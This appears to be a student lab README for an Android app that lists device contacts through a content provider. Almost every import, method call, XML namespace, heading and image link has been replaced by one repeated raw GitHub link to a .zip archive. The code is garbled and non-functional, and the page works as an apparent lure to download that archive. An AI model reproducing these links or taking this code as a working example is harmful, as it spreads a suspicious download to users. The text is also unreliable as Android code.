
# https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip Create Your Own Content Providers to get Contacts details.


## AIM:

To create your own content providers to get contacts details using Android Studio.

## EQUIPMENTS REQUIRED:

Android Studio(Latest Version)

## ALGORITHM:

Step 1: Open Android Stdio and then click on File -> New -> New project.

Step 2: Then type the Application name as “contentprovider″ and click Next. 

Step 3: Then select the Minimum SDK as shown below and click Next.

Step 4: Then select the Empty Activity and click Next. Finally click Finish.

Step 5: Design layout in https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip

Step 6: Get contacts details and Display details give in MainActivity file.

Step 7: Save and run the application.

## PROGRAM:
```
/*
Program to print the contact name and phone number using content providers.
Developed by: SHAIK MUFEEZUR RAHAMAN
Registeration Number : 212221043007
*/
```
## https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip

```
package https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;
import https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip;


public class MainActivity extends AppCompatActivity {

    private TextView textViewContacts;
    int count=0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(savedInstanceState);
        setContentView(https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip);

        Button buttonLoadContacts = findViewById(https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip);

        https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(new https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip() {
            @Override
            public void onClick(View v) {
                loadContacts();
            }
        });
    }

    private void loadContacts() {
        StringBuilder stringBuilder = new StringBuilder();

        Cursor cursor = getContentResolver().query(https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip,
                null, null, null, null);

        if (cursor != null && https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip() > 0) {
            int nameIndex = https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip);
            int phoneIndex = https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip);

            while (https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip()) {
                String name = nameIndex != -1 ? https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(nameIndex) : "No Name";
                String phoneNumber = phoneIndex != -1 ? https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(phoneIndex) : "No Phone Number";

                https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip("Name: ").append(name).append("\n").append("Phone: ").append(phoneNumber).append("\n\n");
                count = count+1;
            }
            https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip();
            https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip());
            Log.i("Content Provider Demo",https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip());
        } else {
            https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip(this, "No contacts found", https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip).show();
        }

        https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip("Total Count of Contacts: "+count);}
}

```


## https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip
```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip"
    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <Button
        android:id="@+id/button"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Load Contacts"
        android:layout_centerHorizontal="true"
        android:backgroundTint="#2196F3"
        android:layout_marginTop="50dp"/>

</RelativeLayout>
```
## https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip
```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip"
    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip"
    package="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip">

    <application
        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip"
        tools:targetApi="31">
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip" />

                <category android:name="https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip" />
            </intent-filter>
        </activity>
    </application>

</manifest>![Screenshot 2024-09-17 194637](https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip)


```

## OUTPUT

![369594913-fc6194d0-2547-4b2b-b77f-be7c2d0b2899](https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip)

![369594924-25f9c3b7-d55d-4138-8027-752d06507e34](https://raw.githubusercontent.com/githubmufeez45/EX_5_CONTENT-PROVIDER/main/evaporate/EX_5_CONTENT-PROVIDER.zip)




## RESULT
Thus a Simple Android Application create your own content providers to get contacts details using Android Studio is developed and executed successfully.
